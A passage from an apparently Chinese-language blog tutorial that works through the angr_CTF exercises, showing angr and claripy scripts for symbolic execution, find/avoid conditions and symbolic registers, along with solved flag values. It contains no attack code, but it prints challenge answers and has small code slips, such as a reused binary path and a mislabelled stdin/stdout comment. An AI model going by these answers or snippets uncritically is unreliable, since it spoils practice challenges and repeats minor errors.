class="hljs-string">&quot;&lt;需要拿来解题的文件&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><p>上述过程相当于完成了<code>angr</code>的加载。</p><h3 id="初始化-angr">初始化 angr</h3><p><code>Unicorn</code>是 <code>angr</code>的依赖库，在<code>Unicorn</code>下可以执行任意一段二进制的代码，我们对此需要告诉其从哪里开始，因此我们需要对<code>angr</code>进行初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span><br>init_state = p.factory.entry_state()<br></code></pre></td></tr></table></figure><h3 id="执行-angr">执行 angr</h3><p>初始化后我们需要执行<code>angr</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置模拟器</span><br>sm = p.factory.simulation_manager(init_state)<br></code></pre></td></tr></table></figure><p>上述过程中我们设置了一个模拟器，接下来我们需要告诉程序应该到哪里去，我们需要设置目标地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sm.explore(find = <span class="hljs-string">&quot;&lt;目标地址&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><p>此时如果我们找到了通向对应的目标地址的时候，将其打印出来其符号向量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 如果到达目标地址，打印此时的符号向量</span><br><span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br><span class="hljs-comment"># 否则抛出失败异常</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="00-angr-find">00_angr_find</h2><p><img src="https://s2.loli.net/2022/03/15/oYsr4MzlfXy8Lq3.png" alt=""></p><p>第一题拖进<code>IDA</code>分析可以看到是十分简单的，其关键部分便是中间的那个<code>complex_function</code>，我们尝试用<code>angr</code>来进行解题 ( 虽然爆破也可以直接执行 )。</p><p>我们找到对应目标 ( Good Job ) 的地址，将其导入进行求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>    <span class="hljs-comment"># 目标文件的路径</span><br>    path_to_binary = <span class="hljs-string">&#x27;../program/00_angr_find&#x27;</span><br>    <span class="hljs-comment"># 创建angr项目</span><br>    project = angr.Project(path_to_binary)<br>    <br>    <span class="hljs-comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span><br>    initial_state = project.factory.entry_state()<br>    <span class="hljs-comment"># 设置模拟器</span><br>    simulation = project.factory.simgr(initial_state)<br>    <br>    <span class="hljs-comment"># 设置目标地址</span><br>    print_good_addr = <span class="hljs-number">0x0804867D</span><br>    simulation.explore(find=print_good_addr)<br>    <br>    <span class="hljs-comment"># 如果到达目标地址，打印此时的符号向量</span><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-comment"># 否者抛出失败异常</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><blockquote><p>值得注意的是在输出语句中<code>print(solution_state.posix.dumps(sys.stdin.fileno()))</code>，其中的<code>dumps</code>在<code>Python 3.x</code>下运行成功，但是在文档中看到有些写的是<code>dump</code>，不清楚其是否为<code>Python 2.x</code>运行的，上述脚本运行不成功时可以试试看各改一下输出的<code>dump</code></p></blockquote><p>通过上述脚本我们可以直接得到目标地址的值在解密后得到的目标答案。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;FMKGABFY&#x27;<br></code></pre></td></tr></table></figure><p>本题中我们了解到了如何编写<code>angr</code>脚本，了解了如何创建项目，创建模拟器以及如何约束模拟器到对应的地址处和输出约束求解的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">angr.Project(file_path) <span class="hljs-comment">#创建项目</span><br>project.factory.simgr(initial_state) <span class="hljs-comment">#创建模拟器</span><br>simulation.explore(find=addr) <span class="hljs-comment">#约束模拟器到达find指定的地址</span><br>solution_state = simulation.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno())) <span class="hljs-comment">#打印符号向量</span><br></code></pre></td></tr></table></figure><h2 id="01-angr-avoid">01_angr_avoid</h2><p>将程序拖进<code>IDA</code>，反编译主函数程序显示函数过大，无法反编译，在这个题目中我们主要学习<code>angr</code>的<code>avoid</code>的使用，对此我们利用<code>avoid</code>来去除我们不想要到达的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>    <span class="hljs-comment"># 目标文件的路径</span><br>    path_to_binary = <span class="hljs-string">&#x27;../program/00_angr_find&#x27;</span><br>    <span class="hljs-comment"># 创建angr项目</span><br>    project = angr.Project(path_to_binary)<br>    <br>    <span class="hljs-comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span><br>    initial_state = project.factory.entry_state()<br>    <span class="hljs-comment"># 设置模拟器</span><br>    simulation = project.factory.simgr(initial_state)<br>    <br>    <span class="hljs-comment"># 设置目标地址</span><br>    print_good_addr = <span class="hljs-number">0x080485E0</span><br>    try_again_addr = <span class="hljs-number">0x080485F2</span><br>    <br>    <span class="hljs-comment"># simulation.explore(find=print_good_addr)</span><br>    <br>    <span class="hljs-comment"># 在这里可以添加 avoid 来约束我们到达的目的地址 </span><br>    simulation.explore(find=print_good_addr, avoid=try_again_addr)<br>    <span class="hljs-comment"># 如果到达目标地址，打印此时的符号向量</span><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-comment"># 否者抛出失败异常</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是对应的<code>good</code>的地址不是这个字符串的地址，而是打印字符串时的汇编代码对应的地址。</p></blockquote><p>通过上述例子，我们学会了如何加入规避的地址来进行进一步的约束求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">print_good_addr = XXXX<span class="hljs-comment"># 目的地址</span><br>try_again_addr = XXXX<span class="hljs-comment"># 规避地址</span><br>simulation.explore(find=print_good_addr, avoid=try_again_addr)<br></code></pre></td></tr></table></figure><h2 id="01-angr-condition">01_angr_condition</h2><p>将程序拖入<code>IDA</code>可以看到主函数还是和上一题一样，函数过大而无法反编译，同时我们观察一下主函数里的数据可以看到有多个<code>Good Job</code>和多个<code>Try again</code>，此时的一个单一的约束并不能很好的起作用，此时用到了<code>angr</code>中的<code>condition</code>来对多个结果进行约束求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">simulation.explore(find=print_good_addr, avoid=try_again_addr)<br></code></pre></td></tr></table></figure><p>之前我们的约束条件都是上面的<code>explore</code>中加入<code>find</code>和<code>avoid</code>的函数地址，但是实际上<code>find</code>和<code>avoid</code>对应的参数可以是一个函数，我们将在这个函数里面进行一个条件的约束</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">good_job</span>(<span class="hljs-params">state</span>):</span><br>      stdout_output = state.posix.dumps(sys.stdout.fileno())<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Good Job&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_again</span>(<span class="hljs-params">state</span>):</span> <br>      stdout_output = state.posix.dumps(sys.stdout.fileno())<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Try again&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br></code></pre></td></tr></table></figure><blockquote><p><code>stdout_output = state.posix.dumps(sys.stdout.fileno())</code>用来获取标准输出的字符</p></blockquote><p>我们利用获取的标准输出字符来进行创建函数，而进一步对我们的条件进行约束求解，那么我们传入的便不再是一个单一的地址，可以对输出的字符集合进行集体约束求解，得到我们想要的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><br><span class="hljs-comment"># 到达目标地址，打印此时的符号向量</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">good_job</span>(<span class="hljs-params">state</span>):</span><br>    stdout_output = state.posix.dumps(sys.stdout.fileno())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Good Job&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br><br><span class="hljs-comment"># 否则抛出失败异常</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_again</span>(<span class="hljs-params">state</span>):</span> <br>    stdout_output = state.posix.dumps(sys.stdout.fileno())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Try again&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>    path_to_binary = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    <span class="hljs-comment"># 创建angr项目</span><br>    project = angr.Project(path_to_binary)<br>    <span class="hljs-comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span><br>    initial_state = project.factory.entry_state()<br>    <span class="hljs-comment"># 设置模拟器</span><br>    simulation = project.factory.simgr(initial_state)<br>    <span class="hljs-comment"># 设置目标地址</span><br>    simulation.explore(find=good_job, avoid=try_again) <br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>上述例子，我们学会了对输出条件来进行集体约束求解，明白了<code>simulation.explore</code>对应的参数值可以是一个函数，在函数中我们调用标准的输出库，来对输出字符进行约束求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 函数的返回类型为布尔类型 (bool)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">good_job</span>(<span class="hljs-params">state</span>):</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;XXX&quot;</span> <span class="hljs-keyword">in</span> solution_state.posix.dumps(<span class="hljs-number">0</span>) <span class="hljs-comment"># 0 是输出 1 是输入</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_again</span>(<span class="hljs-params">state</span>):</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;XXX&quot;</span> <span class="hljs-keyword">in</span> solution_state.posix.dumps(<span class="hljs-number">0</span>)<br>simulation.explore(find=good_job, avoid=try_again) <span class="hljs-comment"># 参数值为函数</span><br></code></pre></td></tr></table></figure><h2 id="03-angr-symbolic-registers">03_angr_symbolic_registers</h2><p>打开题目一看，程序要求我们输入的是 3 个数据，通过三个复杂的函数进行运算，当三个数运算处理后的返回值均为 1 时，判断输入正确，反之判断错误。之前有一个学长去问过<code>angr_CTF</code>库的原作者问多个输入<code>angr</code>可以直接处理吗，原作者回答可以直接处理，但是为了学习目的我们不直接按照之前几个题目的方式来约束地址或者输出来进行运算。</p><p>我们还是给出之前的代码写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><br><span class="hljs-comment"># 到达目标地址，打印此时的符号向量</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">good_job</span>(<span class="hljs-params">state</span>):</span><br>    stdout_output = state.posix.dumps(sys.stdout.fileno())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Good Job&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br><br><span class="hljs-comment"># 否则抛出失败异常</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_again</span>(<span class="hljs-params">state</span>):</span> <br>    stdout_output = state.posix.dumps(sys.stdout.fileno())<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Try again&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>    path_to_binary = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    <span class="hljs-comment"># 创建angr项目</span><br>    project = angr.Project(path_to_binary)<br>    <span class="hljs-comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span><br>    initial_state = project.factory.entry_state()<br>    <span class="hljs-comment"># 设置模拟器</span><br>    simulation = project.factory.simgr(initial_state)<br>    <span class="hljs-comment"># 设置目标地址</span><br>    simulation.explore(find=good_job, avoid=try_again) <br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br>    <span class="hljs-comment"># cfcdef7a 968d69bd c66a3c12</span><br></code></pre></td></tr></table></figure><p>在题目名称中我们可以看到符号化寄存器的英文，那么什么是符号化寄存器？</p><blockquote><p>设置状态的寄存器值，符号化寄存器值含义就是将寄存器内存储的值设为自变量，而后类别列方程加入约束条件内</p></blockquote><p>似乎有点类似于<code>z3</code>设置多个未知数然后带入方程组进行约束求解。那么我们要怎么做呢？我们先观察一下程序的输入：</p><img src="https://s2.loli.net/2022/03/16/KfW3vZumG2gxEUS.png" style="zoom:80%;" /><p>可以看出来我们的 3 个输入数据先后从<code>ecx</code>中转移到了<code>eax</code>、<code>ebx</code>、<code>edx</code>里，同时在后续复杂函数的处理部分中没有改变 3 个寄存器来进行其他处理，对此我们可以直接设置 3 个未知数来代替这三个寄存器，来参与下面函数的运算和执行。</p><p>要将寄存器符号化我们需要引入一个新的函数库：<code>import claripy</code>，由于我们不再是从主函数( main )直接执行我们的符号化向量，我们需要重新设置一个起始地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置项目开始地址</span><br>start_addr = XXX<br>initial_state = project.factory.blank_state(addr=start_addr)<br></code></pre></td></tr></table></figure><p>其中的<code>project.factory.blank_state</code>与之前的<code>project.factory.entry_state</code>不同了，<code>blank_state</code>相当于表示一个空的地址，需要我们把开始地址进行导入。</p><p>接下来便是将寄存器进行符号化，我们便利用到了之前引入的<code>claripy</code>库，下面给出示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将寄存器符号化</span><br>bit_length = XX  <span class="hljs-comment"># 设置寄存器的长度 如 32 —&gt; int </span><br>register = claripy.BVS(<span class="hljs-string">&#x27;&lt;符号向量取名&gt;&#x27;</span>, bit_length)<br>initial_state.regs.eax = register <span class="hljs-comment"># 将 eax 寄存器符号化</span><br><span class="hljs-comment"># initial_state.regs.xxx = register # xxx 处换成其他寄存器名即可</span><br><span class="hljs-comment"># 设置模拟器</span><br>simulation = project.factory.simgr(initial_state)<br></code></pre></td></tr></table></figure><p>那么我们想要输出对应找到后的寄存器值又该怎么处理呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> simulation.found:<br>   solution_state = simulation.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 条件判断</span><br>   solution = solution_state.se.<span class="hljs-built_in">eval</span>(register)<br><span class="hljs-comment"># 创建输出格式</span><br>   solution = <span class="hljs-string">&#x27;%x&#x27;</span> % (solution)<br>   <span class="hljs-built_in">print</span>(solution)<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>-------------------------------------------------------------<br><span class="hljs-comment"># 如果有多个寄存器时</span><br><span class="hljs-keyword">if</span> simulation.found:<br>   solution_state = simulation.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 条件判断</span><br>   solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(register1)<br>   solution2 = solution_state.se.<span class="hljs-built_in">eval</span>(register2)<br><span class="hljs-comment"># 创建输出格式</span><br>   solution = <span class="hljs-string">&#x27;%x %x&#x27;</span> % (solution1,solution2)<br>   <span class="hljs-built_in">print</span>(solution)<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><p>此时新的脚本可以如下编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/03_angr_symbolic_registers&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    <span class="hljs-comment"># 设置项目开始地址</span><br>    start_addr = <span class="hljs-number">0x0804890E</span><br>    initial_state = project.factory.blank_state(addr=start_addr)<br><br>    <br>   <span class="hljs-comment"># 将寄存器符号化</span><br>    bit_length = <span class="hljs-number">32</span><span class="hljs-comment"># 此处的长度为 bit</span><br>    psd0 = claripy.BVS(<span class="hljs-string">&#x27;psd0&#x27;</span>, bit_length)<br>    psd1 = claripy.BVS(<span class="hljs-string">&#x27;psd1&#x27;</span>, bit_length)<br>    psd2 = claripy.BVS(<span class="hljs-string">&#x27;psd2&#x27;</span>, bit_length)<br><span class="hljs-comment"># 将符号化的寄存器对应到相应的寄存器</span><br>    initial_state.regs.eax = psd0<br>    initial_state.regs.ebx = psd1<br>    initial_state.regs.edx = psd2<br><span class="hljs-comment"># 设置模拟</span><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">good_job</span>(<span class="hljs-params">state</span>):</span><br>        stdout_content = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_content<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fail</span>(<span class="hljs-params">state</span>):</span><br>        stdout_content = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_content<br><br>    simulation.explore(find=good_job, avoid=fail)<br>    <br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(psd0)<br>        solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(psd1)<br>        solution2 = solution_state.se.<span class="hljs-built_in">eval</span>(psd2)<br><span class="hljs-comment"># 创建输出格式</span><br>        solution = <span class="hljs-string">&#x27;%x %x %x&#x27;</span> % (solution0, solution1, solution2)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>            <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>上述过程中我们学习了符号化寄存器，修改对应的输出格式，同时如何更改执行的起始地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置项目开始地址</span><br>start_addr = XXX<br>initial_state = project.factory.blank_state(addr=start_addr)<br><br><span class="hljs-comment"># 将寄存器符号化</span><br>bit_length = XX  <span class="hljs-comment"># 设置寄存器的长度 如 32 —&gt; int </span><br>register = claripy.BVS(<span class="hljs-string">&#x27;&lt;符号向量取名&gt;&#x27;</span>, bit_length)<br>initial_state.regs.eax = register <span class="hljs-comment"># 将 eax 寄存器符号化</span><br><span class="hljs-comment"># initial_state.regs.xxx = register # xxx 处换成其他寄存器名即可</span><br><br><span class="hljs-comment"># 更改输出格式</span><br><span class="hljs-keyword">if</span> simulation.found:<br>   solution_state = simulation.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 条件判断</span><br>   solution = solution_state.se.<span class="hljs-built_in">eval</span>(register)<br><span class="hljs-comment"># solution2 = solution_state.se.eval(register2)</span><br><span class="hljs-comment"># 创建输出格式</span><br>   solution = <span class="hljs-string">&#x27;%x&#x27;</span> % (solution)<br><span class="hljs-comment">#  solution = &#x27;%x %x&#x27; % (solution,solution2)</span><br>   <span class="hljs-built_in">print</span>(solution)<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="04-angr-symbolic-stack">04_angr_symbolic_stack</h2><p>程序名字是符号化栈，对于这个题目我尝试了一下使用之前的<code>02_angr_find_condition</code>来进行约束输出求解，发现<code>angr</code>同样可以直接处理栈，岂不是直接一个输出条件的约束就可以吃遍逆向了？因为有些程序的分支结构十分大，<code>angr</code>会遍历所有可能的分支结构，简单的约束限制求解消耗的时间会十分巨大，所以我们需要进一步的学习来进行约束求解。</p><p><img src="https://s2.loli.net/2022/03/16/2xg7TbQYspFXZ6j.png" alt=""></p><p>在程序里我们的输入是处于栈上的，在<code>scanf</code>过后执行了一个<code>add esp, 10h</code>的操作来清理<code>scanf</code>所产生的栈，因此我们真正的执行部分应该是在<code>add esp, 